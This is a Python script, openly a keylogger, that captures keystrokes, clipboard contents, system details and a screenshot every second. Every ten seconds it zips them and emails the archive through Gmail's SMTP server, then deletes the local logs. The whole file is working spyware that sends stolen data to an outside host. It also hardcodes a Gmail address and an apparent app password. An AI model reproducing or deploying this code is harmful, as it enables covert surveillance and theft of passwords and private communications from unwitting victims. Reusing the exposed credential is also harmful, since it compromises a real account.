import os
import socket
import platform
import time
import threading
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import win32clipboard
from pynput.keyboard import Key, Listener
import pyscreenshot as ImageGrab

# File paths
file_path = "F:\\chrome\\vscode\\keylogger"
os.makedirs(file_path, exist_ok=True)

system_info = os.path.join(file_path, "system.txt")
clipboard_info = os.path.join(file_path, "clipboard.txt")
keys_info = os.path.join(file_path, "keys.txt")
screenshot_folder = os.path.join(file_path, "screenshots")
os.makedirs(screenshot_folder, exist_ok=True)

zip_name = os.path.join(file_path, "logs.zip")
# Email config
email_address = "ramansharma32140@gmail.com"  
password = "quxlyqlktvqaupew"

# Get system info
def get_system_info():
    with open(system_info, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"IP Address: {IPAddr}\n")

# Get clipboard
def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    except:
        data = "Clipboard data could not be retrieved."
    with open(clipboard_info, "w") as f:
        f.write("Clipboard Data:\n" + data)

# Capture screenshots every second
def screenshot_thread():
    count = 0
    while True:
        img = ImageGrab.grab()
        img.save(os.path.join(screenshot_folder, f"screenshot_{count}.png"))
        count += 1
        time.sleep(1)

# Keylogger
def on_press(key):
    with open(keys_info, "a") as f:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)

# Compress files
def compress_files():
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        if os.path.exists(system_info):
            zipf.write(system_info, arcname="system.txt")
        if os.path.exists(clipboard_info):
            zipf.write(clipboard_info, arcname="clipboard.txt")
        if os.path.exists(keys_info):
            zipf.write(keys_info, arcname="keys.txt")
        if os.path.exists(screenshot_folder):
            for file in os.listdir(screenshot_folder):
                full_path = os.path.join(screenshot_folder, file)
                if os.path.isfile(full_path):
                    zipf.write(full_path, arcname=f"screenshots/{file}")

# Send email with attachment
def send_email():
    compress_files()
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = "Logged Files"

    attachment = open(zip_name, "rb")
    part = MIMEBase('application', 'zip')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename=logs.zip")
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, password)
    server.sendmail(email_address, email_address, msg.as_string())
    server.quit()

# Clean up logs after sending
def cleanup():
    files_to_remove = [system_info, clipboard_info, keys_info, zip_name]
    for f in files_to_remove:
        if os.path.exists(f):
            os.remove(f)
    for img in os.listdir(screenshot_folder):
        os.remove(os.path.join(screenshot_folder, img))

# Initial setup
get_system_info()
get_clipboard()

# Start screenshot thread
t = threading.Thread(target=screenshot_thread, daemon=True)
t.start()

# Start keylogger listener in another thread
listener = Listener(on_press=on_press)
listener.start()

# Main loop: send logs every 10 seconds
try:
    while True:
        time.sleep(10)  # 🟢 Send logs every 10 seconds
        send_email()
        cleanup()
        get_system_info()
        get_clipboard()
except KeyboardInterrupt:
    print("Keylogger manually stopped.")
    listener.stop()
